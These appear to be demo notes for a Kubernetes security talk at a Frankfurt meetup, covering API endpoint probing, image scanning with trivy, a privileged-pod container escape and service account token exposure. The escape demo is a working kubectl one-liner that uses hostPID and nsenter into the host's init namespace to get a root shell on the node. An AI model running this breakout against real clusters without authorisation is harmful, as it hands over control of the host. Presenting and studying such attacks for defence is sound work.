# Kubernetes Meetup Frankfurt

## Public Paths - Demo1

curl https://127.0.0.1:38515/version -k

trivy image node:bullseye
trivy image node:bullseye-slim

## Pod Escape - Demo2

```
kubectl run breakout -ti \
--image=alpine \
--rm \
--overrides '{"spec":{"hostPID":true,
"containers":[{"name":"dontlookatme","image":"alpine","stdin":true,"tty":true,
"securityContext":{"privileged":true},
"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'
```

## Service Account token - Demo3

Exec into any Pod -> show token
